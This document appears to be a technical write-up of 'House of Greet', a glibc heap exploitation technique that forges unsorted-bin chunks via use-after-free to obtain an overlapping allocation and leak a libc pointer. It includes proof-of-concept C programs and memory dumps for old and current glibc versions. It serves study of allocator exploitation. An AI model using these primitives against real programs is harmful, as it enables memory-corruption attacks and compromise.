# House of Greet

*My first programming language was JavaScript,*<br>
*I learned it from [https://learn.javascript.ru](https://learn.javascript.ru).*<br>
*Whenever I explored a new topic—whether a first function, a first class method, or a first promise—*<br>
*I always started with a greeting via a `sayHi()` function.*<br>
*My "stage handle" is also based on that function's signature.*<br>
*In the House of Greet technique, a fake chunk "greets" the allocator in such a way*<br>
*that it is accepted as one of its own without breaking the doubly-linked list structure.*<br>

---
The concept of this technique lies in analyzing the **unsorted bin** doubly-linked list mechanics, demonstrating how overlapping allocations within a controlled memory region and leaking the `unsorted_chunks` address from `glibc` interact with cyclic list restoration.

## 1. Two variations across glibc versions:

### 1.1. glibc <= 2.27 (most integrity checks are absent):

- **Use-After-Free** condition affecting the `bk` field of a chunk in the unsorted bin (referred to as **victim_A**).
- A heap leak + knowledge of the address of a "fake" chunk (referred to as **evil**).

### 1.2. glibc > 2.27 (patch adding heap and chunk integrity checks on unlink):

- Everything listed in subsection 1.1.
- Placing another fake chunk at the corresponding offset from **evil** with valid **prev_size** and **size** fields.
- **Use-After-Free** condition affecting the **fd** field of another chunk in the unsorted bin (referred to as **victim_B**).

In variation 1.1, larger chunk sizes (up to ~`0x20000` bytes) are accepted due to the absence of next-chunk validation.<br>In variation 1.2, the resulting region spans from `evil` to `evil + size(evil)`, requiring consistent linking of `evil` with `unsorted_chunks`.<br>
Additionally, the `unsorted_chunks` pointer is written into the qword at index 2 starting from the address of **evil**.

## 2. Allocator mechanics when handling the unsorted bin:

### 2.1. Initial state of the unsorted bin containing 2 freed chunks (after filling tcache/fastbin and placing guard chunks to prevent consolidation):

```text
In the diagram, arrows mean: "points to the chunk itself; e.g., bin via fd points to B, not to the fd field inside B, and B via bk points to bin, not to the bk field inside bin"

					 _______________			 _______________			 _______________			 _______________
					|	   bin		|			|		B		|			|		A		|			|	   bin		|
					|_______________|			|_______________|			|_______________|			|_______________|
					|	   fd		|---------->|	   fd		|---------->|	   fd		|---------->|	   fd		|
					|_______________|			|_______________|			|_______________|			|_______________|
					|	   bk		|<----------|	   bk		|<----------|	   bk		|<----------|	   bk		|
					|_______________|			|_______________|			|_______________|			|_______________|
													  head						  tail
```

Here, `A` is the first freed chunk, and `B` is the second. Insertion into the unsorted bin happens at the head, while traversal for extraction starts from the tail.

*Memory dump*:

**Unsorted bin**:
```text
	   		0x7ffff7e15b20: 0x0000555555559b80    		 		0x0000000000000000
			0x7ffff7e15b30: 0x0000555555559740 <== head		0x0000555555559000 <== tail
```
**Chunk A**:
```text
	   		0x555555559000: 0x0000000000000000 <== prev_size	0x0000000000000421 <== size | PREV_INUSE
			0x555555559010: 0x00007ffff7e15b20 <== fd			0x0000555555559740 <== bk
```
**Chunk B**:
```text
			0x555555559740: 0x0000000000000000 <== prev_size	0x0000000000000421 <== size | PREV_INUSE
			0x555555559750: 0x0000555555559000 <== fd			0x00007ffff7e15b20 <== bk
```

### 2.2. The next `malloc` of a matching size (assuming tcache and fastbin are empty for this size) returns chunk A:

#### 2.2.1. Suppose the requested size is `0x410` bytes, and chunk A's size is `0x420` bytes (user data `0x410` + `0x10` header). Traversal starts from the tail:

```text
					 _______________			 _______________			 _______________			 _______________
					|	   bin		|			|		B		|			|		A		|			|	   bin		|
					|_______________|			|_______________|			|_______________|			|_______________|
					|	   fd		|---------->|	   fd		|---------->|	   fd		|---------->|	   fd		|
					|_______________|			|_______________|			|_______________|			|_______________|
					|	   bk		|<----------|	   bk		|<----------|	   bk		|<----------|	   bk		|
					|_______________|			|_______________|			|_______________|			|_______________|
													  head						(start here)
```

### 2.2.2. How the allocator processes chunk A:

#### 2.2.2.1. Reads the `size` field without flags (masks off `PREV_INUSE` / `IS_MAPPED` / `NOT_MAIN_ARENA` bits) — sees `0x420`.
#### 2.2.2.2. Computes the final chunk size requested by the user (`malloc` argument + `0x10` for the header containing `size`/`prev_size`) — gets `0x410 + 0x10 = 0x420` => chunk A matches the requested size.
#### 2.2.2.3. Starting in glibc 2.28, integrity checks validate heap and chunk A metadata before unlinking:
- **glibc >= 2.28** — Commit **b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c** ("malloc: Additional checks for unsorted bin integrity I."):

```c
3733       if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)
3734               || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
3735             malloc_printerr ("malloc(): invalid next size (unsorted)");
3736           if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
3737             malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
3738           if (__glibc_unlikely (bck->fd != victim)
3739               || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
3740             malloc_printerr ("malloc(): unsorted double linked list corrupted");
3741           if (__glibc_unlikely (prev_inuse (next)))
3742             malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
```

- At offset `0x420` from chunk **A**, there must be a chunk with a valid size (**size >= 0x10**) without the **PREV_INUSE** flag and a valid **prev_size** (`prev_size` = **size** of chunk **A**):

```text
		  			0x555555559000: 0x0000000000000000      							0x0000000000000421
					0x555555559010: 0x00007ffff7e15b20      							0x0000555555559740
						...
					0x555555559420: 0x0000000000000420 <== prev_size = size of chunk A	0x0000000000000300	<== valid size without PREV_INUSE
```

- Doubly-linked list consistency check — **A->bk->fd == A** & **A->fd == unsorted_chunks**:

```text
					Looking at the chunk dump in 2.1, integrity holds: via bk, A points to B, and B, via fd, points back to A.
```

#### 2.2.2.4. Unlinks chunk A and updates the doubly-linked list state:

```c
3724       while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
3725         {
3726           bck = victim->bk;
3727           size = chunksize (victim);
3728           mchunkptr next = chunk_at_offset (victim, size);
...			   /* integrity checks shown in 2.2.2.3 */
3783           unsorted_chunks (av)->bk = bck;
3784           bck->fd = unsorted_chunks (av);
...
```

> **2.2.2.4.1. `bck = victim->bk;`**<br>**`bck`** points to the chunk preceding **A**, which is chunk **B**.

> **2.2.2.4.2. `unsorted_chunks (av);`**<br>Since there are only 2 chunks in the bin, it wraps around to the **bin address**, and because **A** is the **tail**, `A->fd` points to the **bin** (**`unsorted_chunks (av)`**).

> **2.2.2.4.3. `unsorted_chunks (av)->bk = bck;`**<br>Since chunk **A** is unlinked and **A** was the **tail**, the **tail** must be updated.<br>Noting that the **bin address** is `0x10` below the memory address storing **head** and **tail** (see **2.1**), **`unsorted_chunks (av)->bk = bck`** writes directly into the **tail**.

> **2.2.2.4.4. `bck->fd = unsorted_chunks (av);`**<br>Chunk **B** now points to the **bin**. Logically, chunk **A** is now unlinked.

> **2.2.2.4.5.** Performs remaining heap adjustments and returns the **address of chunk A** from the next **`malloc`**.

## 3. Walkthrough of the two glibc variants:

### 3.1. Variant 1: glibc <= 2.27 (tested on Ubuntu GLIBC 2.23-0ubuntu5, release 2.23):
---

**Lab Setup / Code Snippet**:
```c
#include <stdlib.h>
			 
int main() {
    long* victim_A = (long*)malloc(0x410);
    malloc(0x10);
    long* B = (long*)malloc(0x410);
    malloc(0x10);
			      
    free(victim_A);
    free(B);
			 
    long* evil = (long*)0x602050;
			    
    evil[1] = 0x20011;
    evil[3] = (long)B - 0x10;
		      
	/* VULNERABILITY */
    victim_A[1] = (long)evil;

	long* c = (long*)malloc(0x410);
	long* evil_address = (long*)malloc(0x20000);

	long* e = malloc(0x410);

	return 0;
}
```

### 3.1.1. Initial heap state matching 2.2.1:

**Unsorted bin**:
```text
					0x7ffff7dd1b78: 0x0000000000602c90      0x0000000000000000
					0x7ffff7dd1b88: 0x0000000000602850      0x0000000000602410
```
**Chunk victim_A**:
```text
					0x602410:       0x0000000000000000      0x0000000000000421
					0x602420:       0x00007ffff7dd1b78      0x0000000000602850
```
**Chunk B**:
```text
					0x602850:       0x0000000000000000      0x0000000000000421
					0x602860:       0x0000000000602410      0x00007ffff7dd1b78
```

### 3.1.2. Fake chunk structure in the controlled region with `evil->bk` pointing to chunk B:

**Chunk evil**:
```text
					0x602050:       0x0000000000000000      0x0000000000020011
					0x602060:       0x0000000000000000      0x0000000000602850	<== evil->bk == B
```

### 3.1.3. State of `victim_A` after updating `victim_A->bk` to point to `evil`:

**Chunk victim_A after modification**:
```text
					0x602410:       0x0000000000000000      0x0000000000000421
					0x602420:       0x00007ffff7dd1b78      0x0000000000602050	<== victim_A->bk == evil
```

### 3.1.4. First allocation matching `victim_A`'s size via `malloc(0x410)`:

#### 3.1.4.1. Following steps 2.2.2.1 and 2.2.2.2 into 2.2.2.4:

- In step **2.2.2.4.2**, **`bck`** resolves to **`evil`** (`victim_A->bk == evil`).
- In step **2.2.2.4.3**, the allocator updates the **unsorted bin tail** to **`evil`**:

**Unsorted bin**:
```text
						0x7ffff7dd1b78: 0x0000000000602c90      0x0000000000000000
						0x7ffff7dd1b88: 0x0000000000602850      0x0000000000602050	<== evil is now the new tail
```

- In step **2.2.2.4.4**, the allocator writes the `unsorted_chunks` address into **`bck->fd <=> evil->fd`**, exposing a **`glibc` pointer** in the readable region:<br><br>

**Chunk evil**:
```text
				  		0x602050:       0x0000000000000000      						0x0000000000020011
						0x602060:       0x00007ffff7dd1b78	<== unsorted_chunks			0x0000000000602850
```

### 3.1.5. Second allocation matching `evil`'s size via `malloc(0x20000)`:

#### 3.1.5.1. Following steps 2.2.2.1 and 2.2.2.2 into 2.2.2.4:

- In step **2.2.2.4.1**, **`bck`** resolves to **`B`** (`evil->bk == B`).
- In step **2.2.2.4.3**, the allocator updates the **unsorted bin** tail to **`B`**, leaving it as the **last** valid chunk in the **unsorted bin**:

**Unsorted bin**:
```text
						0x7ffff7dd1b78: 0x0000000000602c90      0x0000000000000000
						0x7ffff7dd1b88: 0x0000000000602850      0x0000000000602850
```

- In step **2.2.2.4.4**, the allocator writes the `unsorted_chunks` address into **`bck->fd <=> B->fd`**, wrapping the doubly-linked list back to the **bin address**:

**Chunk B**:
```text
				  		0x602850:       0x0000000000000000      0x0000000000000421
						0x602860:       0x00007ffff7dd1b78      0x00007ffff7dd1b78
```

- **`malloc`** returns a pointer at **`evil + 0x10`** with **`0x20000`** bytes of user data.
- The next allocation matching **`B`**'s size returns **`B`**, leaving the **unsorted bin** empty:

**Unsorted bin**:
```text
						0x7ffff7dd1b78: 0x0000000000602c90      0x0000000000000000
						0x7ffff7dd1b88: 0x00007ffff7dd1b78      0x00007ffff7dd1b78
```

### 3.2. Variant 2: glibc >= 2.28 (tested on Debian GLIBC 2.42-5, release 2.42):
---

**Lab Setup / Code Snippet**:
```c
#include <stdlib.h>
 
int main() {
    long* evil1part = (long*)malloc(0x20);

    long* victim_A = (long*)malloc(0x410);
    malloc(0x10);
    long* victim_B = (long*)malloc(0x410);
    
    long* evil2part = (long*)malloc(0x10);
  
    free(victim_A);
    free(victim_B);
 
    /* HEAP GROOMING */
    evil1part[1] = 0x891;
    evil1part[2] = (long)victim_A - 0x10;
    evil1part[3] = (long)victim_B - 0x10;

    evil2part[0] = 0x890;
    evil2part[1] = 0x20;
      
    /* VULNERABILITY */
    victim_A[1] = (long)evil1part;
    victim_B[0] = (long)evil1part;

    long* c = (long*)malloc(0x410);
    long* d = (long*)malloc(0x880);

    long* e = malloc(0x410);

    return 0;
}
```

### 3.2.1. Initial heap state matching 2.2.1:

**Unsorted bin**:
```text
					0x7ffff7e15b20: 0x0000555555559bb0      0x0000000000000000
					0x7ffff7e15b30: 0x0000555555559770      0x0000555555559330
```
**Chunk victim_A**:
```text
					0x555555559330: 0x0000000000000000      0x0000000000000421
					0x555555559340: 0x00007ffff7e15b20      0x0000555555559770
```
**Chunk victim_B**:
```text
					0x555555559770: 0x0000000000000000      0x0000000000000421
					0x555555559780: 0x0000555555559330      0x00007ffff7e15b20
```

### 3.2.2. Setting up `evil1part` (with `bk = victim_B` and `fd = victim_A`) and `evil2part` at `evil1part + size(evil1part)` to satisfy the 2.28 next-chunk checks:

**Chunk evil1part**:
```text
					0x555555559300: 0x0000000000000000      							0x0000000000000031
					0x555555559310: 0x0000000000000000      							0x0000000000000891	<== evil header
					0x555555559320: 0x0000555555559330	<== evil1part->fd == victim_A	0x0000555555559770	<== evil1part->bk == victim_B
```

This satisfies the first doubly-linked list check:
```c
3738           if (__glibc_unlikely (bck->fd != victim)	/* victim_A->bk points to evil1part, so evil1part->fd must point to victim_A */
3739               || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
3740             malloc_printerr ("malloc(): unsorted double linked list corrupted");
```

**Chunk evil2part**:
```text
					0x555555559b90: 0x0000000000000420      											0x0000000000000020
					0x555555559ba0: 0x0000000000000890	<== evil2part->prev_size == size(evil1part)      0x0000000000000020 <== valid chunksize without PREV_INUSE
```

This satisfies the adjacent next-chunk validation checks:
```c
3733       if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ)
3734               || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
3735             malloc_printerr ("malloc(): invalid next size (unsorted)");
3736           if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
3737             malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
...
3741           if (__glibc_unlikely (prev_inuse (next)))
3742             malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
```

### 3.2.3. State after updating `victim_A->bk` and `victim_B->fd` to point to `evil`:

**Chunk victim_A after modification**:
```text
					0x555555559330: 0x0000000000000000      0x0000000000000421
					0x555555559340: 0x00007ffff7e15b20      0x0000555555559310	<== victim_A->bk == evil
```

**Chunk victim_B after modification**:
```text
					0x555555559770: 0x0000000000000000      						0x0000000000000421
					0x555555559780: 0x0000555555559310	<== victim_B->fd == evil    0x00007ffff7e15b20
```

This keeps the doubly-linked list check valid across both iterations:
```c
3738           if (__glibc_unlikely (bck->fd != victim)	/* By the second iteration, bck is evil1part->bk == victim_B, so victim_B->fd must point to evil1part */
3739               || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
3740             malloc_printerr ("malloc(): unsorted double linked list corrupted");
```

### 3.2.4. First allocation matching `victim_A`'s size via `malloc(0x410)`:

#### 3.2.4.1. Following steps 2.2.2.1 and 2.2.2.2 into 2.2.2.4:

- In step **2.2.2.4.1**, **`bck`** resolves to **`evil`** (`victim_A->bk == evil`).
- In step **2.2.2.4.3**, the allocator updates the **unsorted bin tail** to **`evil`**:

**Unsorted bin**:
```text
						0x7ffff7e15b20: 0x0000555555559bb0      0x0000000000000000
						0x7ffff7e15b30: 0x0000555555559770      0x0000555555559310	<== evil is now the new tail
```

- In step **2.2.2.4.4**, the allocator writes the `unsorted_chunks` address into **`bck->fd <=> evil->fd`**, exposing a **`glibc` pointer**:

**Chunk evil**:
```text
				  		0x555555559300: 0x0000000000000000      0x0000000000000031
						0x555555559310: 0x0000000000000000      0x0000000000000891
						0x555555559320: 0x00007ffff7e15b20      0x0000555555559770	<== obtained the leak
```

### 3.2.5. Second allocation matching `evil`'s size via `malloc(0x880)`:

#### 3.2.5.1. Following steps 2.2.2.1 and 2.2.2.2 into 2.2.2.4:

- In step **2.2.2.4.1**, **`bck`** resolves to **`B`** (`evil->bk == B`).
- In step **2.2.2.4.3**, the allocator updates the **unsorted bin** tail to **`B`**, leaving it as the **last** valid chunk in the **unsorted bin**:

**Unsorted bin**:
```text
						0x7ffff7e15b20: 0x0000555555559bb0      0x0000000000000000
						0x7ffff7e15b30: 0x0000555555559770      0x0000555555559770
```

- In step **2.2.2.4.4**, the allocator writes the `unsorted_chunks` address into **`bck->fd <=> B->fd`**, wrapping the doubly-linked list back to the **bin address**:

**Chunk B**:
```text
				  		0x555555559770: 0x0000000000000000      0x0000000000000421
						0x555555559780: 0x00007ffff7e15b20      0x00007ffff7e15b20
```

- **`malloc`** returns a pointer at **`evil + 0x10`** with **`0x880`** bytes of user data, overlapping chunks **`victim_A`** and **`victim_B`**.
- The next allocation matching **`B`**'s size returns **`B`**, leaving the **unsorted bin** empty:

**Unsorted bin**:
```text
						0x7ffff7e15b20: 0x0000555555559bb0      0x0000000000000000
						0x7ffff7e15b30: 0x00007ffff7e15b20      0x00007ffff7e15b20
```

# Summary
On **glibc** versions `<= 2.27`, this mechanism requires only a **heap leak** and a **UAF** on a single chunk, resulting in an arbitrary-size allocation and an `unsorted_chunks` **leak**. On **glibc** versions `>= 2.28`, the hardening patch narrows this flexibility without eliminating **House of Greet** entirely; the updated prerequisites involve a **UAF** on a **second chunk** and forged next-chunk metadata (`prev_size` and `size` without `PREV_INUSE`). Compared to standard UAF techniques such as **tcache poisoning**, **fastbin dup**, and **tcache stashing unlink**, **House of Greet** yields a chunk that **overlaps** intermediate heap structures while **preserving** unsorted bin integrity afterward.